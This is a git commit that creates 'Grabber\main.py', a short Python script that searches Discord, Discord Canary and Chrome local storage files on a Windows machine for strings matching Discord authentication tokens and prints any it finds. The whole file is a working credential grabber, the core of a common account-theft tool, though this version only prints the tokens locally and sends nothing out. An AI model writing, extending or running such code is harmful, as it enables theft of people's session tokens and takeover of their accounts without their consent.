d2a1fd7478d0cd2bd8464b410d78e55280a15d45
Fweak <freakgamer2331@gmail.com>
2020-03-22 23:16:20 -0700

    Create Grabber\main.py

---
+++ Grabber\main.py
@@ -0,0 +1,15 @@
+import os, re
+
+dirs = [os.environ.get("APPDATA") + "\\Discord\\Local Storage\\leveldb", os.environ.get("APPDATA") + "\\discordcanary\\Local Storage\\leveldb", os.environ.get("USERPROFILE") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb"]
+
+for location in dirs:
+    for file in os.listdir(location):
+        with open(f"{location}\\{file}", encoding='utf-8', errors='ignore') as _data:
+            try:
+                regex = re.findall(r"[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}", _data.read())
+                if regex:
+                    for reg in regex:
+                        print(reg)
+            except PermissionError:
+                continue
+input()
